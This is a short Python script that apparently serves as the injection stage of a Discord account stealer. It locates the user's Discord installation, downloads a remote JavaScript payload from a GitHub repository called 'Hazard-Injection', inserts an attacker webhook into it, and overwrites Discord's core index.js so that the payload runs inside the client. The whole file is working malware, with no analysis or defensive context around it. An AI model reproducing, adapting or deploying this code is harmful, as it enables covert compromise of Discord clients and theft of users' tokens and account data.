import ntpath
import os
import re
from sys import argv
import httpx


class Start:
    def __init__(self):
        self.Webhook = "__WEB%HOOK__"
        self.local = os.getenv("localappdata")
        self.startup_loc = ntpath.join(
            os.getenv("appdata"),
            "Microsoft",
            "Windows",
            "Start Menu",
            "Programs",
            "Startup",
        )
        self.discord = self.local + "\\Discord"
        for d in os.listdir(ntpath.abspath(self.discord)):
            if re.match(r"app-(\d*\.\d*)*", d):
                self.app = ntpath.abspath(ntpath.join(self.discord, d))
                self.modules = ntpath.join(self.app, "modules")
                if not ntpath.exists(self.modules):
                    httpx.post(self.Webhook, json="")
                for dir in os.listdir(self.modules):
                    if re.match(r"discord_desktop_core-\d+", dir):
                        self.inj_path = (
                            self.modules + "\\" + dir + f"\\discord_desktop_core\\"
                        )
                        if ntpath.exists(self.inj_path):
                            if self.startup_loc not in argv[0]:
                                try:
                                    os.makedirs(
                                        self.inj_path + "initiation", exist_ok=True
                                    )
                                except PermissionError:
                                    pass
                            f = httpx.get(
                                "https://raw.githubusercontent.com/KrynixOfficial/Hazard-Injection/main/index.js"
                            ).text.replace(
                                "webhook: '%WEBHOOK%'", f"webhook: '{self.Webhook}'"
                            )
                            try:
                                with open(
                                    self.inj_path + "index.js", "w", errors="ignore"
                                ) as indexFile:
                                    indexFile.write(f)
                            except PermissionError:
                                pass


Start()
